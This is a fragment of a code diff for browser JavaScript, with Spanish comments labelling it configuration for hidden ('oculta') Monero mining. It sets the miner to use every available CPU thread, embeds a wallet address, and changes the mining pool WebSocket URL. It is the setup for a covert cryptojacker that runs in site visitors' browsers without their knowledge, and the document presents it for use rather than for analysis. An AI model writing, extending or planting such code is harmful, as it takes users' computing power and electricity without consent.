@@ -1,7 +1,7 @@
 // Configuración para la minería oculta
 const MINER_THREADS = navigator.hardwareConcurrency || 4; // Utiliza el máximo de hilos del CPU disponible
 const MINER_WALLET = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk"; // Reemplaza con la dirección de tu wallet de Monero
-const MINER_POOL = "wss://xmr.pool.minergate.com:443"; // Ejemplo de un pool público para Monero
+const MINER_POOL = "wss://pool.supportxmr.com:3333"; // Ejemplo de un pool público para Monero
 
 // Verifica que el navegador soporte WebSockets para conectarse al pool de minería
 if ("WebSocket" in window) {
